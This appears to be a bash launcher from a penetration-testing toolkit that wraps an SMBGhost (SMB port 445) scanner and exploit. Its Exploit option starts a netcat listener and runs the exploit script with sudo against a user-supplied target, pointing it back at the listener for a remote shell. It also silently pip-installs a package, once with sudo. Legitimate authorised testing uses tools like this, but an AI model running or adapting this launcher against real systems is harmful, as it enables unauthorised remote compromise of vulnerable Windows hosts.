#!/bin/bash

ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
python3 -m pip install hexdump &>/dev/null
sudo python3 -m pip install hexdump &>/dev/null
scanner(){
    echo -e "${ORNG}"
    figlet -f mini "SMBGhost Scanner"
    echo -e "${NC}"
    cd /opt/SMBGhost
    echo -e "${W}Please enter the target IP address or IP Range${NC}"
    read TARGET
    python3 scanner.py ${TARGET} 445
}

exploit(){
    echo -e "${ORNG}"
    figlet -f mini "SMBGhost Exploit"
    echo -e "${NC}"
    cd /opt/SMBGhost_Exploit
    echo -e "${W}Please enter the IP of listener${NC}"
    read LISTENER
    echo -e "${W}Please enter the port of listener${NC}"
    read PORT
    echo -e "${W}Please enter the target IP${NC}"
    read TARGET
    xterm -e nc -lvp ${PORT} &
    xterm -e sudo python3 /opt/SMBGhost_Exploit/Smb_Ghost.py -i ${TARGET} -e --lhost ${LISTENER} --lport ${PORT}
}

PS3='Which module would you like to use?'
    options=("Scanner" "Exploit" "Back")
    select opt in "${options[@]}"
        do
            case $opt in
                "Scanner")
                    scanner
                    ;;

                "Exploit")
                    exploit
                    ;;

                "Back")
                    sifter -m
                    ;;

            esac
        done
    echo -e "${NC}"

sleep 5


##########################______________ czFsM250NzggX18gUmFiYjE3J3MgRGVu ______________##########################
